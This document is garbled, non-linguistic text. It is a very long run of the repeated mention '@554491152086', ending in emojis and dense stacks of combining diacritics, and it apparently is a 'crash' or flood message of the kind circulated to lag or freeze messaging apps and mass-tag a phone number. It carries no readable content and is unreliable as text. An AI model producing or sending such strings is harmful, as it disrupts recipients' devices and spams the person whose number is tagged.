54491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086​@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086@554491152086🕯️۞͓͓͓͓͖͖͖̈́̈́̈́̈́͗͗͗͗͗͗͗͗͗͗ƤǶƎߕ௦̴̧̫̫̫̫̦̪̪̞̪̭̪̙̜̖̖̩̬̩̭̞̗̝̐̐̑̕۞͓͓͓͓͖͖͖̈́̈́̈́̈́͗͗͗͗͗͗͗͗͗͗🕯️ 🌑͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋